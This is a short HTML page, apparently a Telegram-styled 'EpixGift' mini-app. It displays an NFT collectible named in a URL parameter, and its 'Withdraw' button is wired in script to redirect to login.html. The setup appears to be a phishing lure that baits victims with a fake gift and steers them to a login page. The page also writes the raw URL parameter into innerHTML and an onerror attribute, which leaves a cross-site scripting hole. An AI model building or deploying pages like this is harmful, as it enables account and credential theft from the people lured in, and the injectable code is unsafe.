<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>EpixGift</title>
    <style>
        body { background-color: #0e141b; color: white; font-family: sans-serif; margin: 0; padding: 15px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
        .nft-card { background: #1c252f; border-radius: 15px; padding: 12px; border: 1px solid #2a3644; text-align: center; }
        /* Контейнер для фото, чтобы не было пустого места */
        .img-container { width: 100%; aspect-ratio: 1/1; border-radius: 10px; margin-bottom: 10px; background: #2a3644; overflow: hidden; }
        .img-container img { width: 100%; height: 100%; object-fit: cover; }
        .btn-withdraw { display: block; background: #248bdf; color: white; text-align: center; font-size: 14px; font-weight: bold; padding: 12px 0; border-radius: 10px; cursor: pointer; border: none; width: 100%; }
    </style>
</head>
<body>
    <div class="header" style="font-size: 20px; font-weight: bold; margin-bottom: 20px;">EpixGift</div>
    <div class="grid" id="main-grid"></div>

    <script>
        const grid = document.getElementById('main-grid');
        const params = new URLSearchParams(window.location.search);
        const id = params.get('item');

        if (id) {
            const title = id.replace(/-/g, ' #');
            // Используем проверенный URL для статики Telegram
            const imgUrl = `https://api.dicebear.com/7.x/identicon/svg?seed=${id}`; // Временная замена, если t.me не отдает фото

            grid.innerHTML = `
                <div class="nft-card">
                    <div class="img-container">
                        <img src="https://t.me/i/nft/${id}.jpg" onerror="this.src='${imgUrl}'">
                    </div>
                    <div style="font-weight: bold; font-size: 14px; margin-bottom: 5px;">${title}</div>
                    <div style="font-size: 12px; color: #8a99a8; margin-bottom: 15px;">Collectible</div>
                    <button class="btn-withdraw" id="withdraw-btn">Withdraw</button>
                </div>
            `;

            // Обработка клика через JS (защита от долгого нажатия)
            document.getElementById('withdraw-btn').onclick = function(e) {
                e.preventDefault();
                window.location.href = "login.html";
            };
        }
    </script>
</body>
</html>
